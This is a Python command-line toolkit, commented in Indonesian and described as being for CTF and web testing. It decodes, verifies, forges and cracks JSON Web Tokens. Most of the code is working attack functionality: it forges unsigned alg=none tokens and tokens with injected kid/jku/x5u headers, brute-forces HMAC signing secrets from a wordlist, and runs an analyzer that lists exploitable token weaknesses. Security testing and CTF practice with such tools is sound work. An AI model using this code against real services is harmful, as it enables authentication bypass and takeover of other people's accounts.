#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""jwt_toolkit.py — decode/verify/forge JWT buat CTF & web testing.

Fitur:
  - decode: parse header+payload tanpa verifikasi
  - verify: cek signature HMAC (butuh secret)
  - forge: bikin token custom (none-alg, HS256, kid/jku/x5u injection)
  - crack: brute secret dari wordlist (HMAC-SHA256)
  - attack: auto-detect kerentanan (none-alg, weak secret, kid path traversal)

    python3 jwt_toolkit.py decode <token>
    python3 jwt_toolkit.py verify <token> --secret <secret>
    python3 jwt_toolkit.py forge --payload '{"user":"admin"}' --alg none
    python3 jwt_toolkit.py crack <token> --wordlist wordlist.txt
    python3 jwt_toolkit.py attack <token> --secret-file wordlist.txt
"""
import argparse, base64, hashlib, hmac, json, sys, time

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)

def decode(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        print("[-] Format JWT tidak valid (butuh 3 segment)")
        return None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload
    except Exception as e:
        print(f"[-] Decode gagal: {e}")
        return None, None

def sign_hmac(data: bytes, secret: bytes, alg: str) -> bytes:
    if alg == "HS256":
        return hmac.new(secret, data, hashlib.sha256).digest()
    elif alg == "HS384":
        return hmac.new(secret, data, hashlib.sha384).digest()
    elif alg == "HS512":
        return hmac.new(secret, data, hashlib.sha512).digest()
    else:
        raise ValueError(f"Algoritma tidak didukung: {alg}")

def verify(token: str, secret: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header, payload = decode(token)
    if not header:
        return False
    alg = header.get("alg", "HS256")
    if alg == "none":
        print("[!] Token pakai alg=none — TANPA signature!")
        return False
    try:
        expected = sign_hmac(f"{parts[0]}.{parts[1]}".encode(), secret.encode(), alg)
        actual = b64url_decode(parts[2])
        return hmac.compare_digest(expected, actual)
    except Exception:
        return False

def forge(payload: dict, alg: str = "HS256", secret: str = "", header_extra: dict = None) -> str:
    header = {"alg": alg, "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    if alg == "none":
        return f"{h}.{p}."
    sig = sign_hmac(f"{h}.{p}".encode(), secret.encode(), alg)
    return f"{h}.{p}.{b64url_encode(sig)}"

def crack(token: str, wordlist: str) -> str | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header, _ = decode(token)
    if not header:
        return None
    alg = header.get("alg", "HS256")
    if alg == "none":
        print("[!] alg=none — tidak perlu crack!")
        return ""
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(parts[2])
    print(f"[*] Cracking {alg} dengan wordlist: {wordlist}")
    with open(wordlist) as f:
        for i, line in enumerate(f, 1):
            secret = line.strip()
            if not secret:
                continue
            try:
                sig = sign_hmac(signing_input, secret.encode(), alg)
            except Exception:
                continue
            if hmac.compare_digest(sig, target_sig):
                print(f"[+] SECRET DITEMUKAN: {secret} (line {i})")
                return secret
            if i % 10000 == 0:
                print(f"    ... {i} candidates tried")
    print("[-] Secret tidak ditemukan di wordlist")
    return None

def attack(token: str, secret_file: str = None):
    print("=" * 60)
    print("JWT ATTACK SURFACE ANALYZER")
    print("=" * 60)
    header, payload = decode(token)
    if not header:
        return
    print(f"\n[*] Header : {json.dumps(header, indent=2)}")
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")
    findings = []
    # 1. alg=none
    if header.get("alg", "").lower() == "none":
        findings.append(("CRITICAL", "alg=none — signature bypass, siapa bisa forge token"))
    # 2. weak secret
    if secret_file and header.get("alg", "").startswith("HS"):
        print(f"\n[*] Mencoba weak secret dari {secret_file} ...")
        secret = crack(token, secret_file)
        if secret is not None:
            findings.append(("HIGH", f"Weak secret: '{secret}' — bisa di-crack offline"))
    # 3. kid injection
    kid = header.get("kid")
    if kid:
        if any(c in str(kid) for c in ["/", "\\", "..", "%"]):
            findings.append(("HIGH", f"kid path traversal: '{kid}'"))
        if "{" in str(kid) or "$" in str(kid):
            findings.append(("MEDIUM", f"kid injection template: '{kid}'"))
    # 4. jku/x5u
    if "jku" in header:
        findings.append(("HIGH", f"jku (JWK Set URL) injection: {header['jku']}"))
    if "x5u" in header:
        findings.append(("MEDIUM", f"x5u (X.509 URL) injection: {header['x5u']}"))
    # 5. alg confusion (RS256 -> HS256)
    if header.get("alg") == "HS256":
        findings.append(("INFO", "HS256 — cek apakah server juga terima RS256 (alg confusion)"))
    # 6. exp check
    exp = payload.get("exp")
    if exp:
        if exp < time.time():
            findings.append(("INFO", f"Token sudah expired (exp={exp})"))
        else:
            findings.append(("INFO", f"Token valid sampai {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(exp))}"))
    print("\n" + "=" * 60)
    if findings:
        print("TEMUAN:")
        for sev, desc in findings:
            icon = {"CRITICAL": "!!!", "HIGH": "!!", "MEDIUM": "!", "INFO": "i"}[sev]
            print(f"  [{icon}] [{sev}] {desc}")
    else:
        print("Tidak ada kerentanan JWT yang terdeteksi.")
    print("=" * 60)

def main():
    parser = argparse.ArgumentParser(description="JWT Toolkit — CTF & web testing")
    sub = parser.add_subparsers(dest="cmd")
    sub.add_parser("decode")
    sub.add_parser("verify")
    sub.add_parser("forge")
    sub.add_parser("crack")
    sub.add_parser("attack")
    # manual arg parsing for simplicity
    args = sys.argv[1:]
    if not args:
        parser.print_help()
        return
    cmd = args[0]
    rest = args[1:]
    if cmd == "decode":
        if not rest:
            print("Usage: jwt_toolkit.py decode <token>")
            return
        header, payload = decode(rest[0])
        if header:
            print("Header :", json.dumps(header, indent=2))
            print("Payload:", json.dumps(payload, indent=2))
    elif cmd == "verify":
        if len(rest) < 3 or rest[1] != "--secret":
            print("Usage: jwt_toolkit.py verify <token> --secret <secret>")
            return
        ok = verify(rest[0], rest[2])
        print("[+] Signature VALID" if ok else "[-] Signature INVALID")
    elif cmd == "forge":
        import argparse as ap
        p = ap.ArgumentParser()
        p.add_argument("--payload", required=True)
        p.add_argument("--alg", default="HS256")
        p.add_argument("--secret", default="")
        p.add_argument("--header", default=None, help="JSON extra header")
        a = p.parse_args(rest)
        payload = json.loads(a.payload)
        extra = json.loads(a.header) if a.header else None
        tok = forge(payload, a.alg, a.secret, extra)
        print(tok)
    elif cmd == "crack":
        if len(rest) < 3 or rest[1] != "--wordlist":
            print("Usage: jwt_toolkit.py crack <token> --wordlist <file>")
            return
        crack(rest[0], rest[2])
    elif cmd == "attack":
        p = argparse.ArgumentParser()
        p.add_argument("token")
        p.add_argument("--secret-file", default=None)
        a = p.parse_args(rest)
        attack(a.token, a.secret_file)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
